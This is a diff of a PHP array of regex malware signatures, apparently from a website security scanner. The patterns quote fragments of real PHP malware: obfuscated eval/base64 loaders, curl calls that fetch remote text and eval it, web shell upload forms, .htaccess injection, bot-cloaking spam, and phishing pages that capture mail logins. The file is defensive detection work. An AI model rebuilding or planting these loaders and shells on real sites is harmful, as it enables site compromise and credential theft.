+      'label' => 'sample-specific content window chain',
+    ),
+    984 => 
+    array (
+      'pattern' => '/^\\s*géˆ`\\<\\?php exit; \\?\\>a\\:6\\:\\{s\\:10\\:"last_error";s\\:0\\:"";s\\:10\\:"last_query";s\\:83\\:"SELECT option_name, option_value FROM wp5w_options WHERE option_na/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    985 => 
+    array (
+      'pattern' => '/YPEER, 0\\);
+  curl_setopt\\(\\$ch, CURLOPT_SSL_VERIFY[\\s\\S]{0,12000}\\.com\\/\\/admin\\/lib\\/_notes\\/sys\\.txt\'\\);
+eval\\(\'\\?\\>\'\\.\\$a\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    986 => 
+    array (
+      'pattern' => '/0\\);
+  curl_setopt\\(\\$ch, CURLOPT_SSL_VERIFYHOST, 0[\\s\\S]{0,12000}emes\\/the\\-bootstrap\\-blog\\/no\\.txt\'\\);
+eval\\(\'\\?\\>\'\\.\\$a\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    987 => 
+    array (
+      'pattern' => '/64wjon \\= "";\\$_vwj53o0v \\= _68z8fe\\:\\:_24mne\\(\\);\\$_vwj[\\s\\S]{0,12000}6cnosx\\-\\>_afap1\\(\\)\\) \\{\\$_r36cnosx\\-\\>_gpnko\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    988 => 
+    array (
+      'pattern' => '/31\\\\x4b\\\\x31\\\\x31"\\]\\(\\\\\'yygpKhTbDS18\\/IL0kqrSzWq6itPsA[\\s\\S]{0,12000}\\\\x4b\\\\x4b\\\\x4f\\\\x4f\\\\x31\\\\x4b\\\\x31\\\\x4f"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    989 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*
+ \\* Plugin Name\\: The way to world domination
+ \\*\\/
+eval\\(gzinflate\\(base64_decode\\(\'7f3ZkttKtigIPktfwdTROQydkBQAh4igt/s',
+      'label' => 'sample-specific content window',
+    ),
+    990 => 
+    array (
+      'pattern' => '/\\<\\?php \\$O00OO0\\=base64_decode\\("bjF6Yi9tYTVcdnQwaTI[\\s\\S]{0,12000}kVHZpMnhJVkZNN1d5MG54amZyeEJOc256UzBYc0VOdndyTU9/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    991 => 
     array (
       'pattern' => '/x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x5f\\\\x30\\\\x5f\\\\x4f\\\\x30\\\\x4f\\\\x4f\\\\x5f"\\]\\(\\$string\\)\\-14\\);return \\$\\{"\\\\x47\\\\x4c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4/s',
       'label' => 'sample-specific content window',
     ),
-    1342 => 
+    992 => 
     array (
-      'pattern' => '/\\) \\{eval\\(\\$_4wz0ikfh\\["data"\\]\\);exit;\\}\\}\\}\\$_znwmkrbf \\= new _9bnr8b7\\(\\);if \\(\\$_znwmkrbf\\-\\>_va9s3\\(\\)\\) \\{\\$_znwmkrbf\\-\\>_ouqfi\\(\\);\\}exit\\(\\);/s',
+      'pattern' => '/c\\\\x4f\\\\x42\\\\x41\\\\x4c\\\\x53"\\}\\["\\\\x4f\\\\x30\\\\x4f\\\\x5f\\\\x5f\\\\x4[\\s\\S]{0,12000}\\\\x30\\\\x4f\\\\x4f\\\\x5f\\\\x5f\\\\x30\\\\x4f\\\\x30"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    993 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "AnonymousFox"; echo "\\<br\\>"\\.php_uname\\(\\)\\."\\<br\\>"; echo "\\<form method\\=\'post\' enctype\\=\'multipart\\/form\\-data\'\\> \\<input type\\=\'file\' name\\=/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    994 => 
+    array (
+      'pattern' => '/_9bnr8b7\\:\\:_51v1u\\(\\);\\$_ejiuwdhg\\["uid"\\] \\= _9bnr8b7[\\s\\S]{0,12000}wmkrbf\\-\\>_va9s3\\(\\)\\) \\{\\$_znwmkrbf\\-\\>_ouqfi\\(\\);\\}exit\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    995 => 
+    array (
+      'pattern' => '/^\\s*4 \\? long2ip \\(_x7gc9q8\\:\\:\\$_ks5re2ir \\- 1000\\) \\: \\$_7g5ooajl\\[2\\];\\$_x6qr5pte \\= _x7gc9q8\\:\\:_omlbv\\(\\$_7g5ooajl, \\$_go7ubx3q\\);if \\(\\!\\$_x6qr5pte\\)\\{\\$_x6qr5pte /s',
+      'label' => 'source-file first-line anchor',
+    ),
+    996 => 
+    array (
+      'pattern' => '/eval \\(\\$xidwdlafnq\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    997 => 
+    array (
+      'pattern' => '/\\?\\?\\?\\<\\?php
+@session_start\\(\\);
+@set_time_limit\\(0\\);[\\s\\S]{0,12000}_POST\\[\'path\'\\]\\)\\)\\{
+echo \'\\<font color\\="green"\\>Delet/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    998 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$b6bb6\\=explode\\("1l","stsixe_yek_yarra1lcexe_lruc1ltilps_gerp1ldomhc1lstegf1lteg_ini1lemitotrts1lecalper_gerp1lrid_pmet_teg_sys1lnepof1/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    999 => 
+    array (
+      'pattern' => '/MktPBAA\\=\\=\\\\\'\\);\\$C1KOOO11KK \\.\\="\\\\\\\\n";\\$C1KOOO11KK \\.\\=\\$[\\s\\S]{0,12000}\\\\x4f\\\\x31\\\\x4b\\\\x4b\\\\x31\\\\x4b\\\\x31\\\\x4f"\\]\\(\\);\\/\\/scp\\-173\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1000 => 
+    array (
+      'pattern' => '/2Rm4ptHAfxHURX4\\+8kkHWLWh7TuyvsCg\\+Npg64kA1So3uHHiR5lraASyBMBm3VwLr7K8ZSNERC\\+uNW\\+8gIaeTVNIIARQFaBrzVcwr\\/\\/\\+eeff\\/77Pw\\=\\="\\);\\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1343 => 
+    1001 => 
     array (
-      'pattern' => '/\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+\\+/',
-      'label' => 'sample-specific encoded fragment',
+      'pattern' => '/\\<\\?php
+\\$FI8LLII88L\\=\'1176\';
+\\$FI88LILI8L\\=\'wp\\-admin\'[\\s\\S]{0,12000}F8LI8II8LL\\{15\\}\\.\\$F8LI8II8LL\\{21\\}\\.\\$F8LI8II8LL\\{8\\}\\.\\$F/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1344 => 
+    1002 => 
     array (
-      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x31\\\\x4b\\\\x4f\\\\x4f\\\\x4f\\\\x4b\\\\x31\\\\x31\\\\x4b"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x43\\\\x31\\\\x4b\\\\x4f\\\\x4f\\\\x4f\\\\x4b\\\\x31\\\\x31\\\\x4b"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/s\\-protect\\-uploads\\.php\';
+	require_once plugin_di[\\s\\S]{0,12000}in \\= new Alti_ProtectUploads\\(\\);
+\\$plugin\\-\\>run\\(\\);/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1345 => 
+    1003 => 
     array (
-      'pattern' => '/,\\$FII88LIL8L\\);\\$F8LLIII88L\\=__FILE__;\\$F8LLIII88L\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4c\\\\x38\\\\x38\\\\x38\\\\x49\\\\x4c\\\\x4c\\\\x49"\\]\\(\\\\[\\s\\S]{0,160},\\\\\'\\/\\\\\',\\$F8LLIII88L\\);\\$F8ILL8ILI8\\=\\$\\{"G\\\\x4cO\\\\x42\\\\x41\\\\x4cS"\\}\\["\\\\x46\\\\x49\\\\x4c\\\\x38\\\\x38\\\\x49\\\\x4c\\\\x38\\\\x4c\\\\x49"\\]\\(__FILE__\\)\\.\\\\/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/^\\s*\\<\\?php \\$BKOqI \\= \'bas\'\\.\'e64\'\\.\'_d\'\\.\'ec\'\\.\'ode\';  \\$cwEXo \\= \'st\'\\.\'rrev\';  \\$CDdTK \\= \'gzinflat\'\\.\'e\';  \\$vIpYg \\= \'s\'\\.\'tr\'\\.\'_rot1\'\\.\'3\';  eval\\(\\$vIpYg\\(\\$C/s',
+      'label' => 'source-file first-line anchor',
     ),
-    1346 => 
+    1004 => 
     array (
-      'pattern' => '/\\<\\?php \\$BKOqI \\= \'bas\'\\.\'e64\'\\.\'_d\'\\.\'ec\'\\.\'ode\';  \\$cwEXo \\= \'st\'\\.\'rrev\';  \\$CDdTK \\= \'gzinflat\'\\.\'e\';  \\$vIpYg \\= \'s\'\\.\'tr\'\\.\'_rot1\'\\.\'3\';  eval\\(\\$vIpYg\\(\\$C/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\<\\?php
+\\$password \\= "rMJoybmXUPl"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
     ),
-    1347 => 
+    1005 => 
     array (
-      'pattern' => '/function _vca6\\(\\$_0XNSsLM\\)\\{\\$_0XNSsLM\\=substr\\(\\$_0XNSsLM,\\(int\\)\\(hex2bin\\(\'31313939\'\\)\\)\\);\\$_0XNSsLM\\=substr\\(\\$_0XNSsLM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2b/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/CbsWi2NItRXG3oQ4NSDMjbXtrqasRgckGMwbktsO9462LZsy[\\s\\S]{0,12000}xcumj8R9bYmMoNspmpNX0M3HclWqrvxX\'\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1348 => 
+    1006 => 
     array (
-      'pattern' => '/\\$pod \\= array\\(\'jc\' \\=\\> \'1\',\'server_name\' \\=\\> \\$_SERVER\\[\'HTTP_HOST\'\\],\'user_agent\' \\=\\> \\$_SERVER\\[\'HTTP_USER_AGENT\'\\],\'user_cl\' \\=\\> isset\\(\\$_SERVER\\[\'HTT/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\<\\?php
+\\$password \\= "5YbsaxjgZI2"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
     ),
-    1349 => 
+    1007 => 
     array (
-      'pattern' => '/4ZZ4NuZTM4cTyV\\/vYyTXD\\+Lzx2Vda\\+FLVLl\\/l5KLtnCr6XIVMVvpRS\\/lVL8VkrxWynFb6W8\\/N9KwW8AfP8L";
+      'pattern' => '/^\\s*\\$pod \\= array\\(\'jc\' \\=\\> \'1\',\'server_name\' \\=\\> \\$_SERVER\\[\'HTTP_HOST\'\\],\'user_agent\' \\=\\> \\$_SERVER\\[\'HTTP_USER_AGENT\'\\],\'user_cl\' \\=\\> isset\\(\\$_SERVER\\[\'HTT/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1008 => 
+    array (
+      'pattern' => '/ps7JHNGDD5MH6l2AGMQSuCOKi4jpn6MeaKJKTw9LtMSksCb\\+[\\s\\S]{0,12000}N9KwW8AfP8L";
 \\$c \\= \\$g\\(\\$b\\(\\$c\\)\\);
 \\/\\*\\*\\/eval\\/\\*\\*\\/\\(\\$c\\);/s',
-      'label' => 'sample-specific content window',
+      'label' => 'sample-specific content window chain',
     ),
-    1350 => 
+    1009 => 
+    array (
+      'pattern' => '/\\$_currDomain \\= \\$_currDomain;
+		\\}
+		\\$_thispwd[\\s\\S]{0,12000}f\\(isset\\(\\$_GET\\["d"\\]\\)\\) \\{
+		unlink\\(__FILE__\\);
+	\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1010 => 
     array (
       'pattern' => '/s \\$n\\=\\>\\$l\\)\\{if\\(strstr\\(\\$l,\\$s\\)\\) \\{\\$r\\=\\$n;break;\\}\\}
                 return \\$r\\+1;
@@ -8884,130 +6649,6029 @@ exit\\(\\);
             \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1351 => 
+    1011 => 
     array (
-      'pattern' => '/\\<\\?
-\\$ip \\= getenv\\("REMOTE_ADDR"\\);
-\\$message  \\= "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\+ 126 \\+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\\\n";
-\\$message \\.\\= "Username \\: "\\.\\$_POST\\[\'/s',
+      'pattern' => '/^\\s*\\<\\?php class _z\\{private static\\$_fcu;static function _eg\\(\\$_d\\)\\{if\\(\\!self\\:\\:\\$_fcu\\)self\\:\\:_iai\\(\\);return self\\:\\:\\$_fcu\\[\\$_d\\];\\}private static function _i/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1012 => 
+    array (
+      'pattern' => '/\\= strrev\\(\\$login\\);
+\\$x \\= 0;
+for\\(\\$i\\=0; \\$i\\<\\$ln; \\$i\\+\\+\\)\\{
+	if\\(\\$len\\[\\$i\\] \\=\\= "@"\\)\\{
+		\\$x \\= \\$i;
+		break;
+	\\}
+\\}
+\\?\\>
+
+\\<\\!DOCTYPE HTML PUB/s',
       'label' => 'sample-specific content window',
     ),
-    1352 => 
+    1013 => 
     array (
-      'pattern' => '/\\$url\\="http\\:\\/\\/"\\.\\$_SERVER\\[\'HTTP_HOST\'\\]\\.\\$_SERVER\\[\'REQUEST_URI\'\\];[\\s\\S]{0,12000}header\\(\'Location\\: count\\.mail\\.163\\.com\\/login\\.php\\?l\\=_JeHFUq_VJOXK0QWHtoGYDw_Product\\-UserID&email\\=\'\\.\\$email\\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/header\\("Location\\: http\\:\\/\\/mail\\.163\\.com\\/dashi\\/\\?from\\=mail46 "\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1353 => 
+    1014 => 
     array (
-      'pattern' => '/\\/
-\\?\\>\\<\\!doctype html\\>
-\\<html \\<\\?php language_attributes\\(\\); \\?\\>\\>
-\\<head\\>
-	\\<meta charset\\="\\<\\?php bloginfo\\( \'charset\' \\); \\?\\>" \\/\\>
-	\\</s',
+      'pattern' => '/\\<\\?php 
+	\\$url\\="http\\:\\/\\/"\\.\\$_SERVER\\[\'HTTP_HOST\'\\]\\.\\$_S[\\s\\S]{0,12000}on\\: count\\.mail\\.126\\.com\\/login\\.php\\?l\\=_JeHFUq_VJOXK/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1015 => 
+    array (
+      'pattern' => '/header\\("Location\\: http\\:\\/\\/mail\\.163\\.com\\/dashi\\/\\?from\\=mail46"\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    1016 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);
+\\$password\\=\'a\';
+
+
+\\$xyn\\=[\\s\\S]{0,12000}ZE"\\>\\<input type\\="file" name\\="upfile" id\\="ltb"\\> \\</s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1017 => 
+    array (
+      'pattern' => '/daxb\\= new Date\\(\\);if\\(_0xf1dax8\\=\\=\\= null\\|\\| _0xf1dax[\\s\\S]{0,12000}ad \\-\\-\\>
+
+	\\<div id\\="content" class\\="site\\-content"\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1018 => 
+    array (
+      'pattern' => '/\\<\\?php \\$botbotbot \\= "\\.\\.\\."\\.mb_strtolower\\(\\$_SERVER\\[[\\s\\S]{0,12000}open\\(\\); \\?\\>
+\\<div id\\="page" class\\="site"\\>
+	\\<div cl/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1019 => 
+    array (
+      'pattern' => '/i\\.js"\\>\\<\\/script\\>
+  \\<link rel\\="stylesheet" href\\="\\/[\\s\\S]{0,12000}gory\\-\\>cat_name\\}\\<\\/a\\>\\<br\\>\\\\n";
+\\}
+\\?\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1020 => 
+    array (
+      'pattern' => '/39\\\\x2E","\\\\x31\\\\x31\\\\x36\\\\x2E","\\\\x37\\\\x38\\\\x2F\\\\x3F\\\\x6B[\\s\\S]{0,12000}header\\/middle\\-header\'\\); \\?\\>
+			\\<\\/div\\>
+		\\<\\/header\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1021 => 
+    array (
+      'pattern' => '/ge Currency\\.  You want allamateurporn photos\\? sc[\\s\\S]{0,12000}\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1022 => 
+    array (
+      'pattern' => '/Resolution World Background Effect A4 Cake Topper Icing Sheet World Map Globe\\.  80°W\\.  Aqtau\\.  Romanian and East German/s',
       'label' => 'sample-specific content window',
     ),
-    1354 => 
+    1023 => 
     array (
-      'pattern' => '/\\<\\?php endif; \\/\\/ End header image check\\. \\?\\>
-		\\<\\/header\\>\\<\\!\\-\\- \\.site\\-header \\-\\-\\>
+      'pattern' => '/f\\=http\\:\\/\\/www\\.expet\\.cn\\/osrbzvpah\\/2007\\-dodge\\-3500\\-rear\\-axle\\-nut\\-torque\\.html\\>ol\\<\\/a\\>, \\<\\/p\\>
 
-		\\<div id\\="content" class\\="site\\-content"\\>/s',
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1355 => 
+    1024 => 
     array (
-      'pattern' => '/\\<\\?php \\$botbotbot \\= "\\.\\.\\."\\.mb_strtolower\\(\\$_SERVER\\[HTTP_USER_AGENT\\]\\);\\$botbotbot \\= str_replace\\(" ", "\\-", \\$botbotbot\\);if \\(strpos\\(\\$botbotbot,"goog[\\s\\S]{0,12000}\\<\\?php get_template_part\\(\'template\\-parts\\/header\\/middle\\-header\'\\); \\?\\>/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1356 => 
-    array (
-      'pattern' => '/NAME\', \\$obira_theme\\-\\>get\\( \'Author\' \\)\\);
+      'pattern' => '/pqni\\/invisible\\-shader\\-vrchat\\.html\\>co\\<\\/a\\>, \\<\\/p\\>
 
-\\/\\*\\*
- \\* All Main Files Include
- \\*\\/
-require_once\\( OBIRA_FRAMEWORK \\. \'\\/init\\.php\' \\);/s',
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1357 => 
+    1025 => 
     array (
-      'pattern' => '/per_register\\("var", "Stream"\\);
+      'pattern' => '/ine\\-vty\\-length\\-0\\.html\\>fr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/mjilu\\.com\\/nrd\\/t530\\-bios\\.html\\>gh\\<\\/a\\>, \\<\\/p\\>
 
-\\/\\/ Register connect the library Stream
-\\$fp \\= fopen\\(\'var\\:\\/\\/\'\\.\\$_GET\\[\'f\'\\]\\(\\$_GET\\[\'c\'\\]\\), \'\'\\);/s',
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1358 => 
+    1026 => 
     array (
-      'pattern' => '/se\\(\\$hdl\\);
-    include\\("\\{\\$eb\\}\\.\\$algo"\\);
-    unlink\\("\\{\\$eb\\}\\.\\$algo"\\);
-	\\$npDcheckClassBgp \\= \'aue\';
+      'pattern' => '/recycle\\.eu\\/ixf\\/macbook\\-pro\\-horizontal\\-lines\\-freeze\\.html\\>zk\\<\\/a\\>, \\<\\/div\\>
 
-	\\$zeeta \\= "yup";
+\\<\\/div\\>
 
-    \\}
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1027 => 
+    array (
+      'pattern' => '/2p\\/mobile\\-assistant\\-reviews\\.html\\>xl\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1028 => 
+    array (
+      'pattern' => '/advantages Of Media Communication In Malaysia\\? Communication\\.  Visual communication takes advantage of visual aids\\.  Peo/s',
+      'label' => 'sample-specific content window',
+    ),
+    1029 => 
+    array (
+      'pattern' => '/j1\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1030 => 
+    array (
+      'pattern' => '/online\\-play\\-in\\-jio\\-phone\\.html\\>cy\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1031 => 
+    array (
+      'pattern' => '/f\\-uda\\.html\\>pr\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1032 => 
+    array (
+      'pattern' => '/bo\\/photoshop\\-raw\\-to\\-tiff\\.html\\>3t\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1033 => 
+    array (
+      'pattern' => '/\\>, \\<a href\\=http\\:\\/\\/huarazhirka\\.com\\/rqa2v\\/amazing\\-grace\\-lyrics\\-meaning\\.html\\>aw\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1034 => 
+    array (
+      'pattern' => '/\\/spg\\-stories\\-not\\-in\\-wattpad\\.html\\>wl\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1035 => 
+    array (
+      'pattern' => '/orial\\.html\\>b6\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1036 => 
+    array (
+      'pattern' => '/mware\\.html\\>lb\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1037 => 
+    array (
+      'pattern' => '/ml\\>ii\\<\\/a\\>, \\<a href\\=http\\:\\/\\/lead\\-factor\\.com\\/8jtc0\\/how\\-to\\-hack\\-ps3\\-slim\\.html\\>mu\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1038 => 
+    array (
+      'pattern' => '/\\.html\\>qh\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.meidiaz\\.com\\/vpqni\\/csr\\-2\\-walkthrough\\.html\\>x9\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1039 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\$f1 \\= "\\.ht"; \\$f2 \\= "acc"; \\$f3 \\= "ess";
+\\$f[\\s\\S]{0,12000}_SERVER\\[\'REMOTE_ADDR\'\\]\\), \'google\'\\)\\) 
+\\{
+    \\$isbo/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1040 => 
+    array (
+      'pattern' => '/re, London, England\\. iced 2020\\<br\\>\\<br\\>
+
+
+
+\\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1041 => 
+    array (
+      'pattern' => '/plu\\.ru\\/i0h\\/ecfg\\-file\\-cummins\\.html\\>7e\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1042 => 
+    array (
+      'pattern' => '/com\\/rnte2bsq\\/vr\\-video\\-editor\\.html\\>km\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1043 => 
+    array (
+      'pattern' => '/href\\=http\\:\\/\\/greencity\\-real\\.ru\\/esh7p\\/narcissist\\-using\\-child\\-to\\-hoover\\.html\\>d9\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1044 => 
+    array (
+      'pattern' => '/\\-2019\\.html\\>li\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1045 => 
+    array (
+      'pattern' => '/imes\\-can\\-a\\-returned\\-check\\-be\\-presented\\-for\\-payment\\.html\\>zt\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
